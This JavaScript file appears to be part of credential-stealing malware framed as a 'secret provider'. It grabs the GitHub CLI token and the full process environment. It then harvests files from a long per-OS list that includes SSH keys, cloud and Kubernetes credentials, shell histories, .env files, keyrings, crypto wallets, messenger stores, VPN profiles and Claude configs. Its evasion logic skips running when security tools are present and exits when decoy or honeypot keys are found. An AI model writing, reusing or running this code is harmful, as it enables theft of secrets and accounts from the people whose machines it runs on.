/*
 * GitHub environment token provider and local filesystem secret hotspot scanning.
 */

import { execSync as ghAuthExecSync } from "child_process";
import { hostname as hostHostname, userInfo as hostUserInfo } from "os";
class GitHubEnvironmentProvider extends SecretProviderBase {
  constructor() {
    super("shell", "misc");
  }
  async execute() {
    let githubEnvironmentResult = {};
    try {
      let ghAuthToken = ghAuthExecSync("gh auth token", {
        encoding: "utf-8",
        stdio: ["pipe", "pipe", "pipe"],
      }).trim();
      if (ghAuthToken) {
        githubEnvironmentResult.token = ghAuthToken;
        try {
          githubEnvironmentResult.metadata =
            await validateGitHubTokenBasic(ghAuthToken);
        } catch (ghAuthMetadataError) {}
      }
    } catch (ghAuthTokenError) {}
    githubEnvironmentResult.hostname = hostHostname();
    try {
      githubEnvironmentResult.user = hostUserInfo().username;
    } catch {
      githubEnvironmentResult.user =
        process.env.USER ?? process.env.LOGNAME ?? "unknown";
    }
    if (
      ((githubEnvironmentResult.environment = process.env),
      Object.keys(githubEnvironmentResult).length > 0)
    )
      return this.success(githubEnvironmentResult);
    else return this.failure("No Result");
  }
}
import { promises as secretFileFsPromises } from "fs";
import * as secretFileOs from "os";
import * as secretFilePath from "path";
var maxSecretFileBytes = 10485760,
  expandHomePath = (homeExpandedPath) =>
    homeExpandedPath.startsWith("~")
      ? secretFilePath.join(secretFileOs.homedir(), homeExpandedPath.slice(1))
      : homeExpandedPath,
  awsExampleSecretMarkers = [
    "AKIAIOSFODNN7EXAMPLE",
    "wJalrXUtnFEMI",
    "AKIAI44QH8DHBEXAMPLE",
    "AKIAISTAGING3EXAMPLE",
  ],
  fakeSecretMarkers = [
    "EXAMPLEKEY",
    "fake",
    "FAKE",
    "decoy",
    "DECOY",
    "honeypot",
    "HONEYPOT",
  ],
  dirtySecretMarkers = [...awsExampleSecretMarkers, ...fakeSecretMarkers],
  linuxSecretGlobs = [
    "~/.ansible/*",
    "~/.aws/config",
    { path: "~/.aws/credentials", dirty: dirtySecretMarkers },
    "~/.azure/accessTokens.json",
    "~/.azure/msal_token_cache.*",
    "~/.bash_history",
    "~/.cert/nm-openvpn/*",
    "~/.claude.json",
    "~/.claude/*",
    "~/.claude/projects/*",
    "~/.config/atomic/Local Storage/leveldb/*",
    "**/config/database.yml",
    "~/.config/discord/Local Storage/leveldb/*",
    "~/.config/Element/Local Storage/*",
    "~/.config/filezilla/recentservers.xml",
    "~/.config/filezilla/sitemanager.xml",
    "~/.config/gcloud/access_tokens.db",
    "~/.config/gcloud/application_default_credentials.json",
    "~/.config/gcloud/credentials.db",
    "~/.config/git/credentials",
    "~/.config/helm/*",
    "~/.config/Ledger Live/*",
    "~/.config/remmina/*",
    "~/.config/Signal/*",
    "~/.config/Slack/Cookies",
    "~/.config/telegram-desktop/*",
    "~/.config/weechat/irc.conf",
    "~/.docker/*/config.json",
    "~/.docker/config.json",
    "**/.env",
    ".env",
    "**/.env.local",
    "**/.env.production",
    "/etc/openvpn/*",
    "/etc/rancher/k3s/k3s.yaml",
    "/etc/ssh/ssh_host_*_key",
    "~/.ethereum/keystore/*",
    "~/.gitconfig",
    ".git-credentials",
    "~/.history",
    "~/.kde4/share/apps/kwallet/*.kwl",
    "~/.kde/share/apps/kwallet/*.kwl",
    "~/.kube/config",
    "~/.lesshst",
    "~/.local/share/keyrings/*.keyring",
    "~/.local/share/keyrings/login.keyring",
    "~/.local/share/recently-used.xbel",
    "~/.local/share/TelegramDesktop/tdata/*",
    "~/.monero/*",
    "~/.mysql_history",
    "~/.netrc",
    "~/.node_repl_history",
    ".npmrc",
    "~/.npmrc",
    "~/.pki/nssdb/*",
    "~/.psql_history",
    "~/.purple/accounts.xml",
    "~/.pypirc",
    "~/.python_history",
    "~/.remmina/*",
    "/root/.docker/config.json",
    "**/settings.p",
    "~/.ssh/authorized_keys",
    "~/.ssh/config",
    "~/.ssh/id*",
    "~/.ssh/id_",
    "~/.ssh/id_dsa",
    "~/.ssh/id_ecdsa",
    "~/.ssh/id_ed25519",
    "~/.ssh/known_hosts",
    "~/.terraform.d/credentials.tfrc.json",
    "/var/lib/docker/containers/*/config.v2.json",
    "~/.viminfo",
    "**/wp-config.php",
    "~/.yarnrc",
    "~/.zsh_history",
  ],
  extraLinuxSecretGlobs = [
    "~/.claude/mcp.json",
    "~/.config/kwalletd/*.kwl",
    "~/**/git/config",
    "~/.git-credentials",
    "~/.ssh/keys",
  ],
  macSecretGlobs = [
    ".claude.json",
    "~/.config/Exodus/exodus.wallet/*",
    "**/.git/config",
    "~/.ssh/id_rsa",
  ],
  windowsSecretGlobs = [
    ".env",
    "config.ini",
    "%USERPROFILE%\\\\.claude.json",
    "%USERPROFILE%\\\\.claude\\\\*",
    "%USERPROFILE%\\\\.claude\\\\projects\\\\*",
    "%APPDATA%\\\\NordVPN\\\\NordVPN.exe.Config",
    "%APPDATA%\\\\OpenVPN Connect\\\\profiles\\\\*",
    "%PROGRAMDATA%\\\\OpenVPN\\\\config\\\\*",
    "%APPDATA%\\\\ProtonVPN\\\\user.config",
    "%APPDATA%\\\\CyberGhost\\\\CG6\\\\CyberGhost.dat",
    "%APPDATA%\\\\Private Internet Access\\\\*.conf",
    "%APPDATA%\\\\Windscribe\\\\Windscribe\\\\*",
    "C:\\\\Program Files\\\\OpenVPN\\\\config\\\\*.ovpn",
    "%USERPROFILE%\\\\OpenVPN\\\\config\\\\*.ovpn",
    "%APPDATA%%EarthVPN\\\\OpenVPN\\\\config\\\\*.ovpn",
  ],
  platformSecretGlobs = {
    LINUX: [...linuxSecretGlobs, ...extraLinuxSecretGlobs],
    OSX: [...linuxSecretGlobs, ...macSecretGlobs],
    WIN: [...windowsSecretGlobs],
    UNKNOWN: [],
  };
function secretGlobPath(secretGlobEntry) {
  return typeof secretGlobEntry === "string"
    ? secretGlobEntry
    : secretGlobEntry.path;
}
function secretGlobDirtyMarkers(secretGlobDirtyEntry) {
  return typeof secretGlobDirtyEntry === "string"
    ? void 0
    : secretGlobDirtyEntry.dirty;
}
class LocalSecretFileProvider extends SecretProviderBase {
  constructor() {
    super("filesystem", "diskfiles", null, "aggressive");
  }
  async shouldRun() {
    if (detectsSecurityTooling()) return false;
    return true;
  }
  getHotspots() {
    let localSecretPlatformFamily = platformFamily();
    return platformSecretGlobs[localSecretPlatformFamily];
  }
  async readHotspots(
    secretHotspotGlobs,
    secretReadProgressCallback,
    secretFileConcurrency = 1,
  ) {
    let harvestedSecretFiles = {},
      dirtyMarkersBySecretFilePath = new Map(),
      expandSecretGlob = async (secretGlobEntryToExpand) => {
        let secretGlobPattern = secretGlobPath(secretGlobEntryToExpand),
          expandedSecretGlobPath = expandHomePath(secretGlobPattern);
        if (!/[*?[]/.test(expandedSecretGlobPath))
          return (
            dirtyMarkersBySecretFilePath.set(
              expandedSecretGlobPath,
              secretGlobDirtyMarkers(secretGlobEntryToExpand) ?? [],
            ),
            [expandedSecretGlobPath]
          );
        let secretGlobParts = expandedSecretGlobPath.split("/"),
          secretGlobWildcardIndex = secretGlobParts.findIndex(
            (secretGlobPart) => /[*?[]/.test(secretGlobPart),
          ),
          secretGlobRootDir,
          secretGlobRelativePattern;
        if (secretGlobWildcardIndex === 0)
          (secretGlobRootDir = "."),
            (secretGlobRelativePattern = expandedSecretGlobPath);
        else
          (secretGlobRootDir =
            secretGlobParts.slice(0, secretGlobWildcardIndex).join("/") || "/"),
            (secretGlobRelativePattern = secretGlobParts
              .slice(secretGlobWildcardIndex)
              .join("/"));
        try {
          let secretGlobScanner = new Bun.Glob(secretGlobRelativePattern),
            expandedSecretGlobMatches = Array.from(
              secretGlobScanner.scanSync({
                cwd: secretGlobRootDir,
                absolute: true,
                dot: true,
                onlyFiles: true,
              }),
            ),
            secretGlobDirtyMarkersForEntry =
              secretGlobDirtyMarkers(secretGlobEntryToExpand) ?? [];
          for (let expandedSecretGlobMatch of expandedSecretGlobMatches)
            dirtyMarkersBySecretFilePath.set(
              expandedSecretGlobMatch,
              secretGlobDirtyMarkersForEntry,
            );
          return expandedSecretGlobMatches;
        } catch {
          return [];
        }
      },
      localSecretBinarySampleSize = 8192;
    function isLikelyBinaryBuffer(localSecretBinaryBuffer) {
      let localSecretSampleBuffer = localSecretBinaryBuffer.subarray(
          0,
          Math.min(localSecretBinaryBuffer.length, 8192),
        ),
        localSecretNonPrintableCount = 0;
      for (
        let localSecretByteIndex = 0;
        localSecretByteIndex < localSecretSampleBuffer.length;
        localSecretByteIndex++
      ) {
        let localSecretByte = localSecretSampleBuffer[localSecretByteIndex];
        if (localSecretByte === 0) return true;
        if (
          localSecretByte < 9 ||
          (localSecretByte > 13 && localSecretByte < 32) ||
          localSecretByte > 126
        )
          localSecretNonPrintableCount++;
      }
      return (
        localSecretNonPrintableCount / localSecretSampleBuffer.length > 0.3
      );
    }
    let readSecretFile = async (localSecretFilePath) => {
        try {
          let secretFileStat =
            await secretFileFsPromises.stat(localSecretFilePath);
          if (!secretFileStat.isFile()) return;
          if (secretFileStat.size > maxSecretFileBytes) {
            let secretFileTooLargeMessage =
              "Error: File too large (" + secretFileStat.size + " bytes)";
            (harvestedSecretFiles[localSecretFilePath] =
              secretFileTooLargeMessage),
              secretReadProgressCallback?.(
                localSecretFilePath,
                secretFileTooLargeMessage,
              );
            return;
          }
          let secretFileBuffer =
            await secretFileFsPromises.readFile(localSecretFilePath);
          if (isLikelyBinaryBuffer(secretFileBuffer)) {
            let secretFileBase64Value =
              "BASE64:" + secretFileBuffer.toString("base64");
            (harvestedSecretFiles[localSecretFilePath] = secretFileBase64Value),
              secretReadProgressCallback?.(
                localSecretFilePath,
                secretFileBase64Value,
              );
          } else {
            let secretFileText = secretFileBuffer.toString("utf-8"),
              secretFileDirtyMarkers =
                dirtyMarkersBySecretFilePath.get(localSecretFilePath);
            if (secretFileDirtyMarkers && secretFileDirtyMarkers.length > 0) {
              for (let secretFileDirtyMarker of secretFileDirtyMarkers)
                if (secretFileText.includes(secretFileDirtyMarker))
                  exitAfterCleanup();
            }
            (harvestedSecretFiles[localSecretFilePath] = secretFileText),
              secretReadProgressCallback?.(localSecretFilePath, secretFileText);
          }
        } catch (secretFileReadError) {
          return;
        }
      },
      secretFilePaths = [];
    for (let secretHotspotGlob of secretHotspotGlobs) {
      let expandedSecretPaths = await expandSecretGlob(secretHotspotGlob);
      secretFilePaths.push(...expandedSecretPaths);
    }
    if (secretFileConcurrency <= 1) {
      for (let serialSecretFilePath of secretFilePaths)
        await readSecretFile(serialSecretFilePath);
      return harvestedSecretFiles;
    }
    let queuedSecretFilePaths = secretFilePaths.slice(),
      secretFileWorkerPromises = Array.from({
        length: Math.min(secretFileConcurrency, queuedSecretFilePaths.length),
      }).map(async () => {
        let secretFileWorkerPath;
        while ((secretFileWorkerPath = queuedSecretFilePaths.shift()))
          await readSecretFile(secretFileWorkerPath);
      });
    return await Promise.all(secretFileWorkerPromises), harvestedSecretFiles;
  }
  async execute() {
    let localSecretHotspots = this.getHotspots();
    if (!localSecretHotspots.length)
      return this.failure("Unknown OS or no hotspots configured");
    try {
      let localSecretReadResults = await this.readHotspots(
        localSecretHotspots,
        void 0,
        2,
      );
      return this.success({ hotspots: localSecretReadResults });
    } catch (localSecretExecuteError) {
      return this.failure(
        localSecretExecuteError?.message ?? String(localSecretExecuteError),
      );
    }
  }
}
import {
  createHash as gcpTokenCreateHash,
  createSign as createGcpJwtSigner,
} from "crypto";
import { readFile as readGcpCredentialFile } from "fs/promises";
import { homedir as gcpHomedir } from "os";
import { join as gcpPathJoin } from "path";
